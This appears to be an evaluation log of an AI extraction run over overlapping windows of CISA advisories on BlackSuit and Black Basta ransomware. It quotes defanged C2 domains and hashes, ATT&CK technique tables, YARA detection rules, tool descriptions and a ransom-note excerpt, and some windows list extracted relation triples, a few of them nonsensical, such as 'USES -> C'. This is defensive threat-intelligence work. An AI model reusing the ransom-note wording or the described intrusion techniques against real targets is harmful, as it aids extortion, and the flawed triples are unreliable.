share.exe



## AA23-061A:evaluation:llama500:25468:26522

Status: empty_extraction
Case time: 0.48 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

[.]122
Nov 2023
45.76.225[.]156
Nov 2023
Table 13: Legitimate Files and Tools Used by Black Suit Ransomware (1 of 3)
File name
Hash Value – SHA-256
Description
share.exe
f02af8ffc37d1874b971307fdec80e33e583b56d9ebabda78a4b8ad038bc3bf0
Cobalt Strike
181.exe
b028eaa0ec452c6844881dc34be813834813a40591b89ea9a57dd4fb4084e477
Cobalt Strike – File name
222wqc.exe
ae724dce252c7b05a84bc264993172cf86950d22744b5e3a1b15ba645d9d3733
Cobalt Strike
gmer.exe
GMER / Rootkit Hunter
PowerTool64.exe
PowerTool64 for hacking
Psexesvc.exe
141b2190f51397dbd0dfde0e3904b264c91b6f81febc823ff0c33da980b69944
Sysinternals
Socks5.ps1
Socks.ps1
25a6f82936134a6c5c0066f382530b9d6bf2c8da6feafe028f166b1a9d7283cf
PowerShell Reverse Proxy
netscan.exe
A network reconnaissance tool
3iSDtcX.exe
e87512ea12288acec611cf8e995c4ced3971d9e35c0c5dcfd9ee17c9e3ed913d
Putty suite
File.exe
f805dafb3c0b7e18aa7d8c96db8e8d4e9301ff619622d1aecc8080e0ecd9ebbe
Putty.exe. Possibly used for C2
Mwntv.sys
6332f189cc71df646ff0f1b9b02a005c9ebda3fe7b9712976660746913b030de
Potential Tool Ingress
AnyDesk



## AA23-061A:evaluation:llama500:26384:27829

Status: candidates_ready_for_review
Case time: 3.47 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

Putty.exe. Possibly used for C2
Mwntv.sys
6332f189cc71df646ff0f1b9b02a005c9ebda3fe7b9712976660746913b030de
Potential Tool Ingress
AnyDesk
1cdafbe519f60aaadb4a92e266fff709129f86f0c9ee595c45499c66092e0499
Potential remote access tool
ScreenConnect
420db40d26d309d3dba3245abb91207f1bca050530545a8048f856e5840d22a2
Potential remote access tool
SharpShares.exe
Enumerate network shares
Networx.exe
Bandwidth utilization
Table 14: Legitimate Files and Tools Used by Black Suit Ransomware (2 of 3)
Filename
Hash Value – SHA-1
Description
181[.]exe
790d40cd16fb458bf99e3600bce29eca06d40b56
Cobalt Strike – Host name
Table 15: Legitimate Files and Tools Used by Black Suit Ransomware (3 of 3)
Filename
File Path
Description
Anydesk.exe
C:\Program Files(x86)\AnyDesk\AnyDesk.exe
Remote Monitoring and Management (RMM) Tool
ehorus_display.exe
C:\Program Files\ehorus_agent\ehorus_display\ehorus_display.exe
RMM Tool
ehorus_launcher.exe
C:\Program Files\ehorus_agent\ehorus_launcher.exe
RMM Tool
Table 16: Domain(s) associated to BlackSuit Ransomware
Domain Name
Description
Abbeymathiass[.]com
Cobalt Strike C2
Mail.abbeymathiass[.]com
Cobalt Strike C2
Store.abbeymathiass[.]com
Cobalt Strike C2
https://file[.]io/ScPd1KcJTtxO
Associated with download of the binary disabler.exe by threat actors
Mail.turnovercheck[.]com
Cobalt Strike C2
Store.turnovercheck[.]com
Cobalt Strike C2
turnovercheck[.]com
Cobalt Strike C2
Hourlyprofitstore[.]com
Cobalt Strike


- Black Suit Ransomware (1 of 3) -> USES -> Putty.exe
  Literal support: Putty.exe.
- Black Suit Ransomware (1 of 3) -> USES -> Cobalt Strike
  Literal support: Cobalt Strike – Host name
- Black Suit Ransomware (1 of 3) -> USES -> Host
  Literal support: Cobalt Strike – Host name
- Black Suit Ransomware (1 of 3) -> USES -> C
  Literal support: C:\Program Files(x86)\AnyDesk\AnyDesk.exe

## AA23-061A:evaluation:llama500:27654:29231

Status: empty_extraction
Case time: 0.45 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

 threat actors
Mail.turnovercheck[.]com
Cobalt Strike C2
Store.turnovercheck[.]com
Cobalt Strike C2
turnovercheck[.]com
Cobalt Strike C2
Hourlyprofitstore[.]com
Cobalt Strike
IPs and Domains for downloads / C2 / exfiltration of communication
https://protect-us.mimecast[.]com/s/A2PyC31xN5IpzR0XUvzaAj?domain=5.181.157.8
https://protect-us.mimecast[.]com/s/CcsrC4xyO7fBK73ztjNfPl?domain=5.181.234.58
https://protect-us.mimecast[.]com/s/NwueC5yzP5IZLW4MulfSrc?domain=137.220.61.94
https://protect-us.mimecast[.]com/s/T3InC2kwM5hpzEOVU9S5zn?domain=147.135.36.162
https://protect-us.mimecast[.]com/s/teBrC1wvL8iMNE56tXga0n?domain=147.135.11.223
Table 17: BlackSuit Ransomware Note and Hash Value
File Name
Hash Value
Description
readme.BlackSuit.txt
1743494f803bbcbd11150a4a8b7a2c5faba1223da607f67d24b18ca2d95d5ba3
Ransomware note
Ransom Note (New August 7, 2024)
Figure 1 shows the observed BlackSuit ransom notes delivered to victims.
Figure 1. BlackSuit Ransom Note
Your safety service did a really poor job of protecting your files against our professionals.
Extortioner named BlackSuit has attacked your system.
As a result all your essential files were encrypted and saved at a secure server for further use and publishing on the Web into the public realm.
Now we have all your files like: financial reports, intellectual property, accounting, law actions and complaints, personal files and so on and so forth.
We are able to solve this problem in one touch.
We (BlackSuit) are ready to give you an opportunity to get all the things back if you agree to make a deal with us.



## AA23-061A:evaluation:llama500:28955:31241

Status: empty_extraction
Case time: 0.53 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

 reports, intellectual property, accounting, law actions and complaints, personal files and so on and so forth.
We are able to solve this problem in one touch.
We (BlackSuit) are ready to give you an opportunity to get all the things back if you agree to make a deal with us.
You have a chance to get rid of all possible financial, legal, insurance and many others risks and problems for a quite small compensation.
You can have a safety review of your systems.
All your files will be decrypted, your data will be reset, your systems will stay in safe.
Contact us through TOR browser using the link:
MITRE ATT&CK Tactics and Techniques
See Table 18 through Table 23 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations. For additional mitigations, see the Mitigations section.
Table 18: BlackSuit Actors ATT&CK Techniques for Resource Development
Technique Title
ID
Use
Acquire Access
T1650
BlackSuit actors may leverage brokers in support of gaining initial access.
Table 19: Cyber Threat Actors ATT&CK Techniques for Initial Access
Technique Title
ID
Use
Remote Services: Remote Desktop Protocol
T1021.001
BlacSuit actors use RDP compromise as secondary initial access vector.
External Remote Services
T1133
BlackSuit actors gain initial access through a variety of RMM software.
Exploit Public Facing Application
T1190
BlackSuit actors gain initial access through public-facing applications.
Phishing
T1566
BlackSuit actors most commonly gain initial access to victim networks via phishing.
Phishing: Spear phishing Attachment
T1566.001
BlackSuit actors used malicious PDF document attachments in phishing campaigns.
Phishing: Spear phishing Link
T1566.002
The actors gain initial access using malvertising links via emails and public-facing sites.
Table 20: Cyber Threat Actors ATT&CK Techniques for Privilege Escalation
Technique Title
ID
Use
(New August 7, 2024) Valid Accounts
T1078
BlackSuit actors used a legitimate admin account to gain access privileges to the domain controller.
Valid Accounts: Domain Accounts
T1078.002
BlackSuit actors used encrypted files to create new admin user accounts.
Table 21: Cyber Threat Actors ATT&CK Techniques for Defense Evasion
Technique Title
ID
Use



## AA23-061A:evaluation:llama500:30968:32954

Status: empty_extraction
Case time: 0.55 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

 admin account to gain access privileges to the domain controller.
Valid Accounts: Domain Accounts
T1078.002
BlackSuit actors used encrypted files to create new admin user accounts.
Table 21: Cyber Threat Actors ATT&CK Techniques for Defense Evasion
Technique Title
ID
Use
Remote Services: Remote Desktop Protocol
T1021.001
BlackSuit actors used valid accounts to move laterally through the domain controller using RDP.
Indicator Removal: Clear Windows Event Logs
T1070.001
BlackSuit actors deleted shadow files and system and security logs after exfiltration.
Automated Collection
T1119
BlackSuit actors used registry keys to auto-extract and collect files.
Domain Policy Modification: Group Policy Modification
T1484.001
BlackSuit actors modified Group Policy Objects to subvert antivirus protocols.
Impair Defenses: Disable or Modify Tools
T1562.001
BlackSuit actors deactivated antivirus protocols.
Table 22: Cyber Threat Actors ATT&CK Techniques for Command and Control
Technique Title
ID
Use
Ingress Tool Transfer
T1105
BlackSuit actors used C2 infrastructure to download multiple tools.
Protocol Tunneling
T1572
BlackSuit actors used an encrypted SSH tunnel to communicate within C2 infrastructure.
Table 23: Cyber Threat Actors ATT&CK Techniques for Impact
Technique Title
ID
Use
Data Encrypted for Impact
T1486
BlackSuit actors encrypted data to determine which files were being used or blocked by other applications.
Detection Methods
(New August 7, 2024) Please reference YARA rule below to aid in detecting BlackSuit activity. Note: The YARA rule is derived from FBI investigations and is not guaranteed to detect confirmed malicious activity.
private rule is_executable {
condition:
uint32(uint32(0x3C)) == 0x00004550
}
rule obfuscates_dlls {
strings:
// Code for unscrambling names of true DLL imports
$code_load_obfuscated = {
c6 84 24 ?? 00 00 00 ??
c6 84 24 ?? 00 00 00 ??
c6 84 24 ?? 00 00 00 ??
c6 84 24 ?? 00 00 00 ??
c6 84 24 ?? 00 00 00 ??
c6 84 24 ?? 00 00 00 ??



## AA23-061A:evaluation:llama500:32858:33890

Status: empty_extraction
Case time: 0.35 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

c6 84 24 ?? 00 00 00 ??
c6 84 24 ?? 00 00 00 ??
c6 84 24 ?? 00 00 00 ??
c6 84 24 ?? 00 00 00 ??
c6 84 24 ?? 00 00 00 ??
c6 84 24 ?? 00 00 00 ??
}
// c6 84 24 ?? 00 00 00 ?? | MOV byte ptr [ESP + ??], ??
$code_deobfuscate = { 99 f7 ?? 8d ?? ?? 99 f7 ?? 88}
// 99 | CDQ
// f7 ?? | IDIV ??
// 8d ?? ?? | LEA ??, ??
// 99 | CDQ
// f7 ?? | IDIV ??
// 88 | MOV
condition:
all of them
}
rule calls_rsa_function {
strings:
// Code for function calls using RSA key
$code_rsa_function_1 = { 8d4c2410 6a?? 6a?? 51 6a?? 6a?? 6a?? 68???????? ffd0 }
// 8d 4c 24 10 | LEA ECX, [esp + 0x10]
// 6a ?? | PUSH ??
// 6a ?? | PUSH ??
// 51 | PUSH ECX
// 6a ?? | PUSH ??
// 6a ?? | PUSH ??
// 6a ?? | PUSH ??
// 68 ?? ?? ?? ?? | PUSH (address of RSA string)
// ff d0 | CALL EAX
$code_rsa_function_2 = { 8d4c2410 6a?? 6a?? 51 56 6a?? 6a?? 68???????? ffd0 }
// 8d 4c 24 10 | LEA ECX, [esp + 0x10]
// 6a ?? | PUSH ??
// 6a ?? | PUSH ??
// 51 | PUSH ECX
// 56 | PUSH ESI
// 6a ?? | PUSH ??
// 6a ?? | PUSH ??
// 68 ?? ?? ?? ?? | PUSH (address of RSA string)



## AA23-061A:evaluation:llama500:33746:34826

Status: empty_extraction
Case time: 0.34 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

 ??
// 6a ?? | PUSH ??
// 51 | PUSH ECX
// 56 | PUSH ESI
// 6a ?? | PUSH ??
// 6a ?? | PUSH ??
// 68 ?? ?? ?? ?? | PUSH (address of RSA string)
// ff d0 | CALL EAX
condition:
any of them
}
rule xor_decoder_functions {
strings:
// Functions 402e00 and 402f00 both appear to contain a xor-decoding loop
// 402e00
$code_xor_loop_1 = { 0f a4 ce ?? 0f ac d5 ?? c1 e1 ?? c1 ea ?? 0b cd 0b f2 99 33 c8 }
// 0f a4 ce ?? | SHLD ESI, param_1, ??
// 0f ac d5 ?? | SHRD EBP, EDX, ??
// c1 e1 ?? | SHL param_1, ??
// c1 ea ?? | SHR EDX, 0x19
// 0b cd | OR param_1, EBP
// 0b f2 | OR ESI, EDX
// 99 | CDQ
// 33 c8 | XOR param_1, EAX
// 402f00
$code_xor_loop_2 = { 0f a4 ce ?? c1 ea ?? 0b f2 c1 e1 ?? 0b c8 0f be c3 8a 1f 99 33 c8 }
// 0f a4 ce ?? | SHLD ESI, param_1, ??
// c1 ea ?? | SHR EDX, ??
// 0b f2 | OR ESI, EDX
// c1 e1 ?? | SHL, param_1, ??
// 0b c8 | OR param_1, EDX
// 0f be c3 | MOVSX EAX, BL
// 8a 1f | BL, byte ptr [EDI]
// 99 | CDQ
// 33 c8 | XOR param_1, EAX
condition:
any of them
}
rule win_BlackSuit_manual {
meta:
author = "CVH - Raleigh"
date = "2024-07-12"
version = "1"



## AA23-061A:evaluation:llama500:34320:35790

Status: empty_extraction
Case time: 0.37 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

 EDX
// 99 | CDQ
// 33 c8 | XOR param_1, EAX
// 402f00
$code_xor_loop_2 = { 0f a4 ce ?? c1 ea ?? 0b f2 c1 e1 ?? 0b c8 0f be c3 8a 1f 99 33 c8 }
// 0f a4 ce ?? | SHLD ESI, param_1, ??
// c1 ea ?? | SHR EDX, ??
// 0b f2 | OR ESI, EDX
// c1 e1 ?? | SHL, param_1, ??
// 0b c8 | OR param_1, EDX
// 0f be c3 | MOVSX EAX, BL
// 8a 1f | BL, byte ptr [EDI]
// 99 | CDQ
// 33 c8 | XOR param_1, EAX
condition:
any of them
}
rule win_BlackSuit_manual {
meta:
author = "CVH - Raleigh"
date = "2024-07-12"
version = "1"
description = "Detects win.BlackSuit. Rules were manually constructed and results should not be considered conclusive."
malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.BlackSuit"
strings:
// Somehow keeps this in plaintext, although in UTF-16
$string_readme = "readme.BlackSuit.txt" nocase wide ascii
// RSA key for encrypting AES encryption key present in plaintext
$string_rsa_key = "BEGIN RSA PUBLIC KEY" nocase wide ascii
// Unusual debug strings
$string_debug_1 = ".rdata$voltmd"
$string_debug_2 = ".rdata$zzzdbg"
// Relevant functions calls
$import_1 = "MultiByteToWideChar"
$import_2 = "EnterCriticalSection"
$import_3 = "GetProcessHeap"
condition:
(is_executable and $string_readme)
Or
($string_readme and
(obfuscates_dlls or calls_rsa_function or xor_decoder_functions)
)
or
2 of (obfuscates_dlls, calls_rsa_function, xor_decoder_functions)
or
1 of (obfuscates_dlls, calls_rsa_function, xor_decoder_functions) and any of them
}



## AA24-131A:evaluation:llama500:4174:6733

Status: candidates_ready_for_review
Case time: 3.15 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a

Exact source window:


Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 16. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Initial Access
Black Basta affiliates primarily use spearphishing [T1566] to obtain initial access. According to cybersecurity researchers, affiliates have also used Qakbot during initial access.[1]
Starting in February 2024, Black Basta affiliates began exploiting ConnectWise vulnerability CVE-2024-1709 [CWE-288] [T1190]. In some instances, affiliates have been observed abusing valid credentials [T1078].
Update November 8, 2024:
In May 2024, Black Basta affiliates launched a social engineering campaign in which targeted users were sent a large volume of spam email, often from legitimate sources like website registrations, email subscriptions, and other marketing content. Black Basta affiliates would subsequently call the victim, act as technical support, and offer to fix the issue [T1566.004]. During this process, the actors requested the victim users download a tool for remote access, such as AnyDesk or Microsoft’s Quick Assist [T1204].
In October 2024, this social engineering campaign incorporated the use of Microsoft Teams to contact victims. Black Basta affiliated operators would message the victims from legitimate Microsoft Teams accounts from external organizations, posing as technical support to resolve the email spam issues. Threat actor follow-on objectives remained the same; Black Basta affiliates requested victim users to download tools for allowing remote access.
Update End
Discovery and Execution
Black Basta affiliates use tools such as SoftPerfect network scanner (netscan.exe) to conduct network scanning. Cybersecurity researchers have observed affiliates conducting reconnaissance using utilities with innocuous file names such as Intel or Dell, left in the root drive C:\ [T1036].[1]
Privilege Escalation
Black Basta affiliates use credential scraping tools like Mimikatz for privilege escalation. According to cybersecurity researchers, Black Basta affiliates have also exploited ZeroLogon (CVE-2020-1472 [CWE-330]), NoPac (CVE-2021-42278 [CWE-20] and CVE-2021-42287 [CWE-269]), and PrintNightmare (CVE-2021-34527 [CWE-269]) vulnerabilities for local and Windows Active Domain privilege escalation [T1068].[1],[2]


- Black Basta affiliates -> USES_TECHNIQUE -> T1566
  Literal support: Black Basta affiliates primarily use spearphishing [T1566] to obtain initial access.
- Black Basta affiliates -> USES_TECHNIQUE -> T1190
  Literal support: Starting in February 2024, Black Basta affiliates began exploiting ConnectWise vulnerability CVE-2024-1709 [CWE-288] [T1190].
- Black Basta affiliates -> USES -> SoftPerfect
  Literal support: Black Basta affiliates use tools such as SoftPerfect network scanner (netscan.exe) to conduct network scanning.
- Black Basta affiliates -> USES -> netscan.exe
  Literal support: Black Basta affiliates use tools such as SoftPerfect network scanner (netscan.exe) to conduct network scanning.

## AA24-131A:evaluation:llama500:6550:8835

Status: candidates_ready_for_review
Case time: 3.13 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a

Exact source window:

1-42278 [CWE-20] and CVE-2021-42287 [CWE-269]), and PrintNightmare (CVE-2021-34527 [CWE-269]) vulnerabilities for local and Windows Active Domain privilege escalation [T1068].[1],[2]
Lateral Movement
Black Basta affiliates use tools such as BITSAdmin and PsExec, along with Remote Desktop Protocol (RDP), for lateral movement. Some affiliates also use tools like Splashtop, Screen Connect, and Cobalt Strike beacons to assist with remote access and lateral movement.
Exfiltration and Encryption
Black Basta affiliates use RClone to facilitate data exfiltration prior to encryption. Prior to exfiltration, cybersecurity researchers have observed Black Basta affiliates using PowerShell [T1059.001] to disable antivirus products, and in some instances, deploying a tool called Backstab, designed to disable endpoint detection and response (EDR) tooling [T1562.001].[3] Once antivirus programs are terminated, a ChaCha20 algorithm with an RSA-4096 public key fully encrypts files [T1486]. A .basta or otherwise random file extension is added to file names and a ransom note titled readme.txt is left on the compromised system.[4] To further inhibit system recovery, affiliates use the vssadmin.exe program to delete volume shadow copies [T1490].[5]
Leveraged Tools
See Table 1 for publicly available tools and applications used by Black Basta affiliates. This includes legitimate tools repurposed for their operations.
Table 1: Tools Used by Black Basta Affiliates
Tool Name
Description
AnyDesk
A remote monitoring and management tool used by Black Basta affiliates to gain access to a victim user’s endpoint.
Microsoft Teams
A messaging application used within organizations and maliciously used by Black Basta affiliates to contact employees.
Microsoft Quick Assist
A remote monitoring and management tool used by Black Basta affiliates to gain access to a victim user’s endpoint.
BITSAdmin
A command-line utility that manages downloads/uploads between a client and server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.
Cobalt Strike
A penetration testing tool used by security professions to test the security of networks and systems. Black Basta affiliates have used it to assist with lateral movement and file execution.
Mimikatz


- Black Basta affiliates -> USES -> BITSAdmin
  Literal support: Black Basta affiliates use tools such as BITSAdmin and PsExec, along with Remote Desktop Protocol (RDP), for lateral movement.
- Black Basta affiliates -> USES -> PsExec
  Literal support: Black Basta affiliates use tools such as BITSAdmin and PsExec, along with Remote Desktop Protocol (RDP), for lateral movement.
- Black Basta affiliates -> USES -> Remote Desktop Protocol
  Literal support: Black Basta affiliates use tools such as BITSAdmin and PsExec, along with Remote Desktop Protocol (RDP), for lateral movement.
- Black Basta affiliates -> USES -> RDP
  Literal support: Black Basta affiliates use tools such as BITSAdmin and PsExec, along with Remote Desktop Protocol (RDP), for lateral movement.

## AA24-131A:evaluation:llama500:8514:10969

Status: candidates_ready_for_review
Case time: 2.68 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a

Exact source window:

 server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.
Cobalt Strike
A penetration testing tool used by security professions to test the security of networks and systems. Black Basta affiliates have used it to assist with lateral movement and file execution.
Mimikatz
A tool that allows users to view and save authentication credentials such as Kerberos tickets. Black Basta affiliates have used it to aid in privilege escalation.
PSExec
A tool designed to run programs and execute commands on remote systems.
PowerShell
A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.
RClone
A command line program used to sync files with cloud storage services such as Mega.
SoftPerfect
A network scanner (netscan.exe) used to ping computers, scan ports, discover shared folders, and retrieve information about network devices via Windows Management Instrumentation (WMI), Simple Network Management Protocol (SNMP), HTTP, Secure Shell (SSH) and PowerShell. It also scans for remote services, registry, files, and performance counters.
ScreenConnect
Remote support, access, and meeting software that allows users to control devices remotely over the internet.
Splashtop
Remote desktop software that allows remote access to devices for support, access, and collaboration.
WinSCP
Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Black Basta affiliates have used it to transfer data from a compromised network to actor-controlled accounts.
Discovery and Execution
Black Basta affiliates use tools such as SoftPerfect network scanner (netscan.exe) to conduct network scanning. Cybersecurity researchers have observed affiliates conducting reconnaissance using utilities with innocuous file names such as Intel or Dell, left in the root drive C:\ [T1036].[1]
Privilege Escalation
Black Basta affiliates use credential scraping tools like Mimikatz for privilege escalation. According to cybersecurity researchers, Black Basta affiliates have also exploited ZeroLogon (CVE-2020-1472 [CWE-330]), NoPac (CVE-2021-42278 [CWE-20] and CVE-2021-42287 [CWE-269]), and PrintNightmare (CVE-2021-34527 [CWE-269]) vulnerabilities for local and Windows Active Domain privilege escalation [T1068].[1],[2]


- Black Basta affiliates -> USES -> SoftPerfect
  Literal support: Black Basta affiliates use tools such as SoftPerfect network scanner (netscan.exe) to conduct network scanning.
- Black Basta affiliates -> USES -> netscan.exe
  Literal support: Black Basta affiliates use tools such as SoftPerfect network scanner (netscan.exe) to conduct network scanning.
- Black Basta affiliates -> USES -> Mimikatz
  Literal support: Black Basta affiliates use credential scraping tools like Mimikatz for privilege escalation.
- Black Basta affiliates -> USES_TECHNIQUE -> T1068
  Literal support: According to cybersecurity researchers, Black Basta affiliates have also exploited ZeroLogon (CVE-2020-1472 [CWE-330]), NoPac (CVE-2021-42278 [CWE-20] and CVE-2021-42287 [CWE-269]), and PrintNightmare (CVE-2021-34527 [CWE-269]) vulnerabilities for local and Windows Active Domain privilege escalation [T1068].[1],[2]

## AA24-131A:evaluation:llama500:10786:13129

Status: candidates_ready_for_review
Case time: 2.79 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a

Exact source window:

1-42278 [CWE-20] and CVE-2021-42287 [CWE-269]), and PrintNightmare (CVE-2021-34527 [CWE-269]) vulnerabilities for local and Windows Active Domain privilege escalation [T1068].[1],[2]
Lateral Movement
Black Basta affiliates use tools such as BITSAdmin and PsExec, along with Remote Desktop Protocol (RDP), for lateral movement. Some affiliates also use tools like Splashtop, Screen Connect, and Cobalt Strike beacons to assist with remote access and lateral movement.
Exfiltration and Encryption
Black Basta affiliates use RClone to facilitate data exfiltration prior to encryption. Prior to exfiltration, cybersecurity researchers have observed Black Basta affiliates using PowerShell [T1059.001] to disable antivirus products, and in some instances, deploying a tool called Backstab, designed to disable endpoint detection and response (EDR) tooling [T1562.001].[3] Once antivirus programs are terminated, a ChaCha20 algorithm with an RSA-4096 public key fully encrypts files [T1486]. A .basta or otherwise random file extension is added to file names and a ransom note titled readme.txt is left on the compromised system.[4] To further inhibit system recovery, affiliates use the vssadmin.exe program to delete volume shadow copies [T1490].[5]
Leveraged Tools
See Table 1 for publicly available tools and applications used by Black Basta affiliates. This includes legitimate tools repurposed for their operations.
Disclaimer: Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control. Black Basta affiliates were observed using these legitimate tools for intended malicious purposes.
Table 1: Tools Used by Black Basta Affiliates
Tool Name
Description
AnyDesk
A remote monitoring and management tool used by Black Basta affiliates to gain access to a victim user’s endpoint.
Microsoft Teams
A messaging application used within organizations and maliciously used by Black Basta affiliates to contact employees.
Microsoft Quick Assist
A remote monitoring and management tool used by Black Basta affiliates to gain access to a victim user’s endpoint.
BITSAdmin
A command-line utility that manages downloads/uploads between a client and server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.
Cobalt Strike


- Black Basta affiliates -> USES -> BITSAdmin
  Literal support: Black Basta affiliates use tools such as BITSAdmin and PsExec, along with Remote Desktop Protocol (RDP), for lateral movement.
- Black Basta affiliates -> USES_TECHNIQUE -> T1059.001
  Literal support: Prior to exfiltration, cybersecurity researchers have observed Black Basta affiliates using PowerShell [T1059.001] to disable antivirus products, and in some instances, deploying a tool called Backstab, designed to disable endpoint detection and response (EDR) tooling [T1562.001].[3] Once antivirus programs are terminated, a ChaCha20 algorithm with an RSA-4096 public key fully encrypts files [T1486].
- Black Basta Affiliates -> USES -> Black Basta
  Literal support: Table 1: Tools Used by Black Basta Affiliates
- Black Basta affiliates -> USES_TECHNIQUE -> T1562.001
  Literal support: Prior to exfiltration, cybersecurity researchers have observed Black Basta affiliates using PowerShell [T1059.001] to disable antivirus products, and in some instances, deploying a tool called Backstab, designed to disable endpoint detection and response (EDR) tooling [T1562.001].[3] Once antivirus programs are terminated, a ChaCha20 algorithm with an RSA-4096 public key fully encrypts files [T1486].

## AA24-131A:evaluation:llama500:12807:15323

Status: candidates_ready_for_review
Case time: 1.90 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a

Exact source window:


A remote monitoring and management tool used by Black Basta affiliates to gain access to a victim user’s endpoint.
BITSAdmin
A command-line utility that manages downloads/uploads between a client and server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.
Cobalt Strike
A penetration testing tool used by security professions to test the security of networks and systems. Black Basta affiliates have used it to assist with lateral movement and file execution.
Mimikatz
A tool that allows users to view and save authentication credentials such as Kerberos tickets. Black Basta affiliates have used it to aid in privilege escalation.
PSExec
A tool designed to run programs and execute commands on remote systems.
PowerShell
A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.
RClone
A command line program used to sync files with cloud storage services such as Mega.
SoftPerfect
A network scanner (netscan.exe) used to ping computers, scan ports, discover shared folders, and retrieve information about network devices via Windows Management Instrumentation (WMI), Simple Network Management Protocol (SNMP), HTTP, Secure Shell (SSH) and PowerShell. It also scans for remote services, registry, files, and performance counters.
ScreenConnect
Remote support, access, and meeting software that allows users to control devices remotely over the internet.
Splashtop
Remote desktop software that allows remote access to devices for support, access, and collaboration.
WinSCP
Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Black Basta affiliates have used it to transfer data from a compromised network to actor-controlled accounts.
MITRE ATT&CK Tactics and Techniques
See Tables 2–6 for all referenced threat actor tactics and techniques in this advisory.
Table 2: Black Basta ATT&CK Techniques for Initial Access
Technique Title
ID
Use
Phishing
T1566
Black Basta affiliates have used spearphishing emails to obtain initial access.
Phishing: Spearphishing Voice
T1566.004
Black Basta affiliates have used spearphishing phone and Microsoft Teams calls to trick users into providing initial access.
Exploit Public-Facing Application
T1190
Black Basta affiliates have exploited ConnectWise vulnerability CVE-2024-1709 to obtain initial access.


- Black Basta affiliates -> USES -> ConnectWise
  Literal support: Black Basta affiliates have exploited ConnectWise vulnerability CVE-2024-1709 to obtain initial access.
- Black Basta Affiliates -> USES -> Black Basta
  Literal support: Table 2: Black Basta ATT&CK Techniques for Initial Access

## AA24-131A:evaluation:llama500:15045:17380

Status: candidates_ready_for_review
Case time: 3.07 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a

Exact source window:

1566.004
Black Basta affiliates have used spearphishing phone and Microsoft Teams calls to trick users into providing initial access.
Exploit Public-Facing Application
T1190
Black Basta affiliates have exploited ConnectWise vulnerability CVE-2024-1709 to obtain initial access.
Table 3: Black Basta ATT&CK Techniques for Privilege Escalation
Technique Title
ID
Use
Exploitation for Privilege Escalation
T1068
Black Basta affiliates have used credential scraping tools like Mimikatz, Zerologon, NoPac and PrintNightmare for privilege escalation.
Table 4: Black Basta ATT&CK Techniques for Defense Evasion
Technique Title
ID
Use
Masquerading
T1036
Black Basta affiliates have conducted reconnaissance using utilities with innocuous file names, such as Intel or Dell, to evade detection.
Impair Defenses: Disable or Modify Tools
T1562.001
Black Basta affiliates have deployed a tool called Backstab to disable endpoint detection and response (EDR) tooling.
Black Basta affiliates have used PowerShell to disable antivirus products.
Table 5: Black Basta ATT&CK Techniques for Execution
Technique Title
ID
Use
User Execution
T1204
Black Basta affiliates have used social engineering techniques to convince users to execute legitimate remote access tools such as AnyDesk and Microsoft’s Quick Assist.
Command and Scripting Interpreter: PowerShell
T1059.001
Black Basta affiliates have used PowerShell to disable antivirus products.
Table 6: Black Basta ATT&CK Techniques for Impact
Technique Title
ID
Use
Inhibit System Recovery
T1490
Black Basta affiliates have used the vssadmin.exe program to delete shadow copies.
Data Encrypted for Impact
T1486
Black Basta affiliates have used a public key to fully encrypt files.
Indicators of Compromise
Update November 8, 2024:
Many indicators provided in this advisory’s initial publication have been removed considering they are outdated. For historic reference, see AA24-131A #StopRansomware: Black Basta (Initial Version).
The IOCs listed in Tables 7–8 were obtained from trusted third-party reporting and are considered most current.
Disclaimer: The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking, as many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains.


- Black Basta affiliates -> USES -> ConnectWise
  Literal support: Black Basta affiliates have exploited ConnectWise vulnerability CVE-2024-1709 to obtain initial access.
- Black Basta affiliates -> USES -> Mimikatz
  Literal support: Black Basta affiliates have used credential scraping tools like Mimikatz, Zerologon, NoPac and PrintNightmare for privilege escalation.
- Black Basta affiliates -> USES -> Zerologon
  Literal support: Black Basta affiliates have used credential scraping tools like Mimikatz, Zerologon, NoPac and PrintNightmare for privilege escalation.
